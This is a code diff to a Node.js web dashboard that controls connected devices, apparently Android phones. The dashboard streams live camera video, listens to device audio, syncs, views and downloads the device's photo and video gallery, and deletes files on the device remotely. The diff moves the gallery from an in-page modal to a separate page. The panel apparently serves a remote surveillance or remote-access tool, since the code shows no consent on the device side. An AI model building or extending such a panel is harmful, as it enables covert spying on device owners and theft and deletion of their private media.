         <div class="quality-grid"><button class="quality-btn" data-quality="120">120p</button><button class="quality-btn" data-quality="140">140p</button><button class="quality-btn active" data-quality="240">240p</button><button class="quality-btn" data-quality="360">360p</button></div>
         <div class="fps-control"><div class="section-title">⚡ FPS</div><input type="range" id="fpsSlider" min="5" max="30" value="15" step="1" class="fps-slider"><div class="fps-value" id="fpsLabel">15 FPS (Recommended)</div></div>
     </div>
     <div class="voice-card">
-        <div class="section-title">🎙️ PCM AUDIO PLAYER</div>
+        <div class="section-title">🎤 PCM AUDIO PLAYER</div>
         <div class="button-group" style="margin-bottom:8px;">
             <button class="btn btn-voice-start" id="voiceStartBtn">🎤 START LISTEN</button>
             <button class="btn btn-voice-stop" id="voiceStopBtn">⏹ STOP</button>
@@ -1179,59 +1302,12 @@ app.get('/', requireAuth, (req, res) => {
     </div>
     <div class="devices"><div class="section-title">📱 CONNECTED DEVICES</div><div id="devicesList"><div class="empty-devices">No devices connected</div></div></div>
 </div>
-
-<!-- GALLERY MODAL -->
-<div class="gallery-modal" id="galleryModal">
-    <div class="gallery-header">
-        <div>
-            <button class="gallery-back" onclick="galleryBack()">← Back</button>
-            <span style="margin-left:15px;font-size:18px;" id="galleryDeviceName">Gallery</span>
-            <span class="gallery-stats" id="galleryStats"></span>
-        </div>
-        <div>
-            <button class="gallery-sync-btn" id="gallerySyncBtn" onclick="syncGallery()">🔄 Sync</button>
-            <button class="gallery-close" onclick="closeGallery()">✕</button>
-        </div>
-    </div>
-    <div id="galleryContent">
-        <div class="gallery-loading">⏳ Loading gallery...</div>
-    </div>
-</div>
-
-<!-- IMAGE / VIDEO VIEWER -->
-<div class="image-viewer" id="imageViewer">
-    <button class="viewer-close" onclick="closeImageViewer()">✕</button>
-    <div id="viewerMediaWrap" style="display:flex;align-items:center;justify-content:center;max-width:95%;max-height:80vh;">
-        <img id="viewerImage" src="" style="display:none;max-width:100%;max-height:80vh;object-fit:contain;border-radius:8px;">
-        <video id="viewerVideo" controls style="display:none;max-width:100%;max-height:80vh;border-radius:8px;background:#000;"></video>
-        <div id="viewerLoading" style="text-align:center;padding:40px;color:#aaa;">
-            <div style="font-size:48px;margin-bottom:12px;">⏳</div>
-            <div id="viewerLoadingText">Loading...</div>
-            <div style="margin-top:8px;font-size:11px;color:#555;">File will appear after device responds</div>
-        </div>
-    </div>
-    <div class="viewer-controls">
-        <button class="viewer-btn" onclick="prevImage()">◀ Prev</button>
-        <span id="viewerCounter" style="color:#888;font-size:13px;">1/1</span>
-        <button class="viewer-btn" onclick="nextImage()">Next ▶</button>
-        <button class="viewer-btn" onclick="downloadCurrent()">⬇ Download</button>
-        <button class="viewer-btn danger" onclick="deleteImage()">🗑️ Delete</button>
-    </div>
-    <div class="viewer-info" id="viewerInfo"></div>
-</div>
-
-
-<!-- STATUS MODAL -->
-<div class="status-modal" id="statusModal" onclick="closeStatusModal()">
-    <div class="status-modal-content" onclick="event.stopPropagation()">
-        <div class="status-modal-header">
-            <span class="status-modal-title" id="modalDeviceName">Device Info</span>
-            <button class="status-modal-close" onclick="closeStatusModal()">✕</button>
-        </div>
+<div id="statusModal" class="status-modal">
+    <div class="status-modal-content">
+        <div class="status-modal-header"><span class="status-modal-title" id="modalDeviceName">Device</span><button class="status-modal-close" onclick="closeStatusModal()">✕</button></div>
         <div id="modalContent"></div>
     </div>
 </div>
-
 <script src="/socket.io/socket.io.js"></script>
 <script>
     const socket = io({ transports: ['websocket', 'polling'] });
@@ -1270,15 +1346,6 @@ app.get('/', requireAuth, (req, res) => {
     let selectedDeviceId = null, currentDevices = [], isStreaming = false, wasStreaming = false;
     let userStoppedStream = false;
     let frameCount = 0, lastFpsUpdate = Date.now(), framePollTimer = null, lastFrameTs = 0;
-
-    // Gallery variables
-    let currentGalleryData = null;
-    let currentGalleryFiles = [];
-    let currentViewerIndex = 0;
-    let currentDeviceIdForGallery = null;
-    let currentFolderData = {};
-    let currentFolderName = null;
-    let galleryInFolderView = false;
 
     const video = document.getElementById('video'),
           placeholder = document.getElementById('placeholder'),
@@ -1343,293 +1410,6 @@ app.get('/', requireAuth, (req, res) => {
             }).catch(() => {});
         }
     }
-
-    // ========== GALLERY FUNCTIONS ==========
-
-    function openGallery(deviceId) {
-        const device = currentDevices.find(d => d.id === deviceId);
-        if (!device) {
-            alert('Device not found');
-            return;
-        }
-
-        currentDeviceIdForGallery = deviceId;
-        document.getElementById('galleryDeviceName').textContent = '📱 ' + device.name;
-        document.getElementById('galleryModal').classList.add('active');
-        document.getElementById('galleryContent').innerHTML = '<div class="gallery-loading">⏳ Loading gallery...</div>';
-        document.getElementById('galleryStats').textContent = '';
-        document.getElementById('gallerySyncBtn').disabled = false;
-        document.getElementById('gallerySyncBtn').textContent = '🔄 Sync';
-
-        loadGallery(deviceId);
-    }
-
-    function loadGallery(deviceId) {
-        fetch('/api/gallery/' + deviceId)
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    currentGalleryData = data;
-                    currentGalleryFiles = data.files || [];
-                    currentFolderData = data.folders || {};
-                    document.getElementById('galleryStats').textContent =
-                        data.images + ' images • ' + data.videos + ' videos • ' + data.count + ' total • ' + data.folderCount + ' folders';
-                    showFolderList();
-                } else {
-                    document.getElementById('galleryContent').innerHTML =
-                        '<div class="gallery-empty"><span>📭</span>No files found</div>';
-                }
-            })
-            .catch(() => {
-                document.getElementById('galleryContent').innerHTML =
-                    '<div class="gallery-empty"><span>❌</span>Error loading gallery</div>';
-            });
-    }
-
-    function showFolderList() {
-        galleryInFolderView = false;
-        currentFolderName = null;
-        const folders = currentFolderData;
-        if (!folders || Object.keys(folders).length === 0) {
-            document.getElementById('galleryContent').innerHTML =
-                '<div class="gallery-empty"><span>📭</span>No folders found</div>';
-            return;
-        }
-        const sortedFolders = Object.keys(folders).sort();
-        let html = '<div class="folder-list">';
-        sortedFolders.forEach(folderName => {
-            const files = folders[folderName];
-            const imgCount = files.filter(f => f.type !== 'video').length;
-            const vidCount = files.filter(f => f.type === 'video').length;
-            const subtitle = (imgCount > 0 ? imgCount + ' photos' : '') +
-                             (imgCount > 0 && vidCount > 0 ? ' • ' : '') +
-                             (vidCount > 0 ? vidCount + ' videos' : '');
-            html += '<div class="folder-card" onclick="openFolder(\'' + folderName.replace(/'/g, "\\'") + '\')">' +
-                '<div class="folder-card-icon">📁</div>' +
-                '<div class="folder-card-name">' + folderName + '</div>' +
-                '<div class="folder-card-count">' + subtitle + '</div>' +
-            '</div>';
-        });
-        html += '</div>';
-        document.getElementById('galleryContent').innerHTML = html;
-    }
-
-    function openFolder(folderName) {
-        galleryInFolderView = true;
-        currentFolderName = folderName;
-        const files = currentFolderData[folderName] || [];
-
-        // Build folder-scoped file list for prev/next navigation within folder
-        currentGalleryFiles = (currentGalleryData && currentGalleryData.files) ? currentGalleryData.files : [];
-
-        let html = '<div class="folder-files-header">' +
-            '<button class="folder-back-btn" onclick="showFolderList()">← Folders</button>' +
-            '<span style="font-size:15px;font-weight:600;color:#ddd;">📁 ' + folderName + '</span>' +
-            '<span style="font-size:12px;color:#666;">(' + files.length + ' files)</span>' +
-        '</div>' +
-        '<div class="gallery-grid">';
-
-        files.forEach(file => {
-            const isVideo = file.type === 'video';
-            const sizeMB = (file.size / (1024 * 1024)).toFixed(1);
-            const date = new Date(file.date).toLocaleDateString();
-            const globalIndex = currentGalleryFiles.findIndex(f => f.name === file.name);
-            html += '<div class="gallery-item ' + (isVideo ? 'video-item' : '') + '" onclick="openImageViewer(' + globalIndex + ')">' +
-                '<div style="background:#1a1a1a;height:150px;display:flex;align-items:center;justify-content:center;font-size:48px;color:#555;">' +
-                    (isVideo ? '🎬' : '📷') +
-                '</div>' +
-                '<div class="gallery-item-info">' +
-                    '<div class="gallery-item-name">' + file.name + '</div>' +
-                    '<div class="gallery-item-size">' + sizeMB + 'MB • ' + date + '</div>' +
-                '</div>' +
-            '</div>';
-        });
-
-        html += '</div>';
-        document.getElementById('galleryContent').innerHTML = html;
-    }
-
-    function galleryBack() {
-        if (galleryInFolderView) {
-            showFolderList();
-        } else {
-            closeGallery();
-        }
-    }
-
-    function syncGallery() {
-        if (!currentDeviceIdForGallery) return;
-        
-        const btn = document.getElementById('gallerySyncBtn');
-        btn.disabled = true;
-        btn.textContent = '⏳ Syncing...';
-        
-        // Send sync command to device
-        if (wsReady) {
-            socket.emit('send_command', { 
-                deviceId: currentDeviceIdForGallery, 
-                command: 'gallery_sync',
-                value: null 
-            });
-        } else {
-            fetch('/api/command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    deviceId: currentDeviceIdForGallery, 
-                    command: 'sync_gallery' 
-                })
-            }).catch(() => {});
-        }
-        
-        // Wait 3 seconds then reload
-        setTimeout(() => {
-            loadGallery(currentDeviceIdForGallery);
-            btn.disabled = false;
-            btn.textContent = '🔄 Sync';
-        }, 3000);
-    }
-
-    function openImageViewer(index) {
-        if (!currentGalleryFiles || currentGalleryFiles.length === 0) return;
-        currentViewerIndex = index;
-        loadImageForViewer(index);
-        document.getElementById('imageViewer').classList.add('active');
-    }
-
-    function loadImageForViewer(index) {
-        const file = currentGalleryFiles[index];
-        if (!file) return;
-
-        document.getElementById('viewerCounter').textContent = (index + 1) + '/' + currentGalleryFiles.length;
-
-        // Show folder name from stored folder or path
-        let folder = file.folder || file.albumName || file.bucketName || '';
-        if (!folder && file.path) {
-            const parts = file.path.split('/');
-            const skip = ['0','emulated','storage','sdcard','Android','media'];
-            for (let i = parts.length - 2; i >= 0; i--) {
-                if (parts[i] && !skip.includes(parts[i]) && !parts[i].includes('.')) {
-                    folder = parts[i]; break;
-                }
-            }
-        }
-        document.getElementById('viewerInfo').innerHTML =
-            (folder ? '<span class="viewer-folder">📁 ' + folder + '</span> • ' : '') +
-            file.name + ' • ' +
-            (file.size / (1024 * 1024)).toFixed(1) + 'MB • ' +
-            new Date(file.date).toLocaleString();
-
-        const deviceId = currentDeviceIdForGallery;
-        const isVideo = file.type === 'video';
-
-        // Reset state
-        const imgEl = document.getElementById('viewerImage');
-        const vidEl = document.getElementById('viewerVideo');
-        const loadEl = document.getElementById('viewerLoading');
-        const loadTxt = document.getElementById('viewerLoadingText');
-        imgEl.style.display = 'none'; imgEl.src = '';
-        vidEl.style.display = 'none'; vidEl.src = ''; vidEl.pause && vidEl.pause();
-        loadEl.style.display = 'block';
-        loadTxt.textContent = isVideo ? '⏳ Requesting video from device...' : '⏳ Requesting image from device...';
-
-        fetch('/api/gallery/file/' + deviceId + '/' + encodeURIComponent(file.name))
-            .then(r => r.json())
-            .then(data => {
-                if (data.success && data.data) {
-                    loadEl.style.display = 'none';
-                    if (isVideo) {
-                        vidEl.src = 'data:video/mp4;base64,' + data.data;
-                        vidEl.style.display = 'block';
-                    } else {
-                        imgEl.src = 'data:image/jpeg;base64,' + data.data;
-                        imgEl.style.display = 'block';
-                    }
-                } else if (data.pending) {
-                    loadTxt.textContent = '📤 Command sent — waiting for device to upload file...';
-                    setTimeout(() => loadImageForViewer(index), 4000);
-                } else {
-                    loadTxt.textContent = '❌ File not available. Try syncing gallery first.';
-                }
-            })
-            .catch(() => {
-                loadTxt.textContent = '❌ Connection error';
-            });
-    }
-
-    function closeImageViewer() {
-        const vid = document.getElementById('viewerVideo');
-        if (vid) { vid.pause(); vid.src = ''; }
-        document.getElementById('imageViewer').classList.remove('active');
-    }
-
-    function prevImage() {
-        if (currentViewerIndex > 0) {
-            currentViewerIndex--;
-            loadImageForViewer(currentViewerIndex);
-        }
-    }
-
-    function nextImage() {
-        if (currentViewerIndex < currentGalleryFiles.length - 1) {
-            currentViewerIndex++;
-            loadImageForViewer(currentViewerIndex);
-        }
-    }
-
-    function downloadCurrent() {
-        const file = currentGalleryFiles[currentViewerIndex];
-        const img = document.getElementById('viewerImage');
-        const vid = document.getElementById('viewerVideo');
-        const src = (img.style.display !== 'none' && img.src) ? img.src :
-                    (vid.style.display !== 'none' && vid.src) ? vid.src : '';
-        if (src && src.startsWith('data:')) {
-            const link = document.createElement('a');
-            link.href = src;
-            link.download = file?.name || 'file';
-            link.click();
-        } else {
-            alert('File not loaded yet. Wait for it to appear first.');
-        }
-    }
-    function downloadImage() { downloadCurrent(); }
-
-    function deleteImage() {
-        if (!confirm('Delete this file?')) return;
-        const file = currentGalleryFiles[currentViewerIndex];
-        if (!file) return;
-
-        fetch('/api/gallery/file/' + currentDeviceIdForGallery + '/' + encodeURIComponent(file.name), {
-            method: 'DELETE'
-        })
-        .then(r => r.json())
-        .then(data => {
-            if (data.success) {
-                alert('File deleted');
-                closeImageViewer();
-                loadGallery(currentDeviceIdForGallery);
-            }
-        })
-        .catch(() => alert('Delete failed'));
-    }
-
-    function closeGallery() {
-        document.getElementById('galleryModal').classList.remove('active');
-        closeImageViewer();
-    }
-
-    // Keyboard shortcuts
-    document.addEventListener('keydown', (e) => {
-        if (e.key === 'Escape') {
-            if (document.getElementById('imageViewer').classList.contains('active')) {
-                closeImageViewer();
-            } else if (document.getElementById('galleryModal').classList.contains('active')) {
-                closeGallery();
-            }
-        }
-        if (e.key === 'ArrowLeft') prevImage();
-        if (e.key === 'ArrowRight') nextImage();
-    });
 
     document.getElementById('startBtn').onclick = () => {
         if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
@@ -1804,7 +1584,7 @@ app.get('/', requireAuth, (req, res) => {
             (d.streaming ? '<span style="font-size:10px;color:#4CAF50;white-space:nowrap;">● LIVE</span>' : '') +
             '</div>' +
             '<div style="display:flex;align-items:center;gap:4px;flex-wrap:wrap;">' +
-            '<button data-gallery="' + d.id + '" style="background:none;border:1px solid #667eea;color:#667eea;font-size:10px;padding:3px 7px;border-radius:8px;cursor:pointer;">📸 Gallery</button>' +
+            '<a href="/gallery/' + d.id + '" style="background:none;border:1px solid #667eea;color:#667eea;font-size:10px;padding:3px 7px;border-radius:8px;cursor:pointer;text-decoration:none;">📸 Gallery</a>' +
             '<button data-info="' + d.id + '" style="background:none;border:1px solid #444;color:#888;font-size:10px;padding:3px 7px;border-radius:8px;cursor:pointer;">ℹ Info</button>' +
             '<div class="device-status-dot status-connected"></div>' +
             '</div></div>'
@@ -1812,11 +1592,6 @@ app.get('/', requireAuth, (req, res) => {
         
         devicesList.querySelectorAll('.device-item').forEach(el => {
             el.addEventListener('click', (e) => {
-                if (e.target.dataset.gallery) { 
-                    const device = currentDevices.find(d => d.id === e.target.dataset.gallery);
-                    if (device) openGallery(device.id);
-                    return;
-                }
                 if (e.target.dataset.info) { 
                     const d = currentDevices.find(x => x.id === e.target.dataset.info); 
                     if (d) showDeviceStatus(d); 
@@ -1842,9 +1617,9 @@ app.get('/', requireAuth, (req, res) => {
             const data = await fetch('/api/devices').then(r => r.json());
             if (data.success) {
                 currentDevices = data.devices;
-                const connectedList = currentDevices.filter(d => d.isConnected);
-                if (!selectedDeviceId && connectedList.length > 0) {
-                    selectedDeviceId = connectedList[0].id;
+                if (!selectedDeviceId && currentDevices.filter(d => d.isConnected).length > 0) {
+                    selectDevice(currentDevices.filter(d => d.isConnected)[0].id);
+                    return;
                 }
                 checkSelectedDeviceStatus(currentDevices);
                 renderDeviceList();
@@ -1935,7 +1710,7 @@ app.get('/', requireAuth, (req, res) => {
                 body: JSON.stringify({ deviceId: selectedDeviceId })
             }).catch(() => {});
         }
-        console.log('🎙️ PCM player started');
+        console.log('🎤 PCM player started');
     };
 
     document.getElementById('voiceStopBtn').onclick = () => {
@@ -2020,7 +1795,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log('📦  Batch Upload : POST /api/batch');
     console.log('⚡  WebSocket    : Stream Only');
     console.log('📡  Commands     : HTTP Polling + WS');
-    console.log('📸  Gallery      : ✅ ENABLED (Folder View)');
+    console.log('📸  Gallery      : ✅ ENABLED (Separate Page)');
     console.log('═══════════════════════════════════════════════════');
     console.log('');
 });
